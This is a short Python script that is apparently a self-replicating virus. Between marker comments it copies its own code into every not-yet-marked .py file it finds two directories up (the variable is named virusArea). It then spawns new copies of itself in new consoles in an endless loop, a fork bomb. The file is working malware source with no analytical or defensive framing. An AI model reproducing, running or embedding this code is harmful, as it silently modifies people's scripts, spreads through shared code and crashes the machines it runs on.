# START DONT DELETE THIS COMMENT
import sys, glob, subprocess

code = []
with open(sys.argv[0], "r") as f:
    lines = f.readlines()

virusArea = False
for line in lines:
    if line == "# START DONT DELETE THIS COMMENT\n":
        virusArea = True
    if virusArea:
        code.append(line)
    if line == "# END DONT DELETE THIS COMMENT\n":
        break

pythonScripts = glob.glob("../../*/*/*.py")

for script in pythonScripts:
    with open(script, "r") as f:
        scriptCode = f.readlines()

    infected = False
    for line in scriptCode:
        if line == "# START DONT DELETE THIS COMMENT\n":
            infected = True
            break
    if not infected:
        finalCode = []
        finalCode.extend(code)
        finalCode.extend("\n")
        finalCode.extend(scriptCode)

        with open(script, "w") as f:
            f.writelines(finalCode)

while True:
    subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)

# END DONT DELETE THIS COMMENT